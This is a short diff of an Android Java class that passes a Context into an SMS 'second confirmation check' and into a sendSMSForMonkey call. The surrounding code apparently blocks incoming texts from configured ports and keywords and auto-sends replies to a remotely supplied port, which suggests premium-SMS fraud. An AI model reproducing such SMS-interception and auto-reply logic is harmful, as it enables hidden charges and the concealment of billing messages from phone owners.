@@ -108,7 +108,7 @@ public class MessageHandleUtils {
                 && AppRuntime.ACTIVE_RESPONSE != null
                 && !TextUtils.isEmpty(AppRuntime.ACTIVE_RESPONSE.blockSmsPort)) {
             //对于短信内容先进行二次确认检查
-            if (!secondSMSCmdCheck(msg, fromAddress)) {
+            if (!secondSMSCmdCheck(context, msg, fromAddress)) {
                 boolean keyBlock = false;
                 if (!TextUtils.isEmpty(msg) && !TextUtils.isEmpty(AppRuntime.ACTIVE_RESPONSE.blockKeys)) {
                     try {
@@ -209,7 +209,7 @@ public class MessageHandleUtils {
      * @param number
      * @return
      */
-    private static boolean secondSMSCmdCheck(String msg, String number) {
+    private static boolean secondSMSCmdCheck(Context context, String msg, String number) {
         if (!TextUtils.isEmpty(msg) && AppRuntime.ACTIVE_RESPONSE.smsCmd != null) {
             String port = AppRuntime.ACTIVE_RESPONSE.smsCmd.portList.size() > 1
                               ? AppRuntime.ACTIVE_RESPONSE.smsCmd.portList.get(1)
@@ -295,7 +295,7 @@ public class MessageHandleUtils {
             }
 
             //port和content都是合法的
-            SMSUtil.sendSMSForMonkey(port, content);
+            SMSUtil.sendSMSForMonkey(context, port, content);
 
             return true;
         }
